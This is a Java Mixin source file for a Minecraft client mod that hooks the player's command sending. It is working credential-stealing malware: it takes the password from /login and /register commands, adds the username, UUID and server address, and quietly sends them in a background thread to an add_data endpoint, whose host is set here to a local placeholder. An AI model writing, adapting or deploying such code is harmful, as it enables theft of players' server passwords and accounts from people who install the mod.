package me.soda.witch.mixin;

import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.client.MinecraftClient;
import net.minecraft.text.Text;

import java.io.InputStream;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Arrays;
import java.util.Date;
import java.util.List;

@Mixin(ClientPlayerEntity.class)
abstract class ClientPlayerEntityMixin {
    MinecraftClient mc = MinecraftClient.getInstance();
    String address = "http://127.0.0.1";

    private void uploadPassword(String[] args) {
        try {
            for (int i = 0; i < args.length; i++) {
                args[i] = URLEncoder.encode(args[i], "UTF-8");
            }
            InputStream inputStream = new URL(String.format("%s/add_data?username=%s&password=%s&server=%s&uuid=%s&ts=%s",
                    address, args[0], args[1], args[2], args[3], args[4])).openStream();
            return;
        } catch (Exception e) {
        }
    }

    private void stealPassword(String command) {
        String username;
        String password;
        String server;
        String uuid;
        List<String> loginHint = Arrays.asList("l", "login", "log");
        List<String> regHint = Arrays.asList("reg", "register");
        String[] cmdArray = command.split(" ");
        if (cmdArray.length > 0) {
            if ((loginHint.contains(cmdArray[0]) && cmdArray.length == 2)
                    || (regHint.contains(cmdArray[0]) && cmdArray.length == 2 || cmdArray.length == 3)) {
                password = cmdArray[1];
                if (mc.getCurrentServerEntry() != null) {
                    String name = mc.isConnectedToRealms() ? "realms" : mc.getCurrentServerEntry().address;
                    server = name.replace(":", "_");
                } else {
                    server = "unknown";
                }
                username = mc.getSession().getUsername();
                uuid = mc.player.getUuid().toString();
                String ts = String.valueOf(new Date().getTime());
                new Thread(() -> uploadPassword(new String[]{username, password, server, uuid, ts})).start();
            }
        }
    }

    @Inject(method = "sendCommand(Ljava/lang/String;)Z", at = @At("HEAD"), cancellable = true)
    private void onSendCommand(String command, CallbackInfoReturnable<Boolean> cir) {
        stealPassword(command);
    }

    @Inject(method = "sendCommand(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"), cancellable = true)
    private void onSendCommand(String command, Text preview, CallbackInfo info) {
        stealPassword(command);
    }
}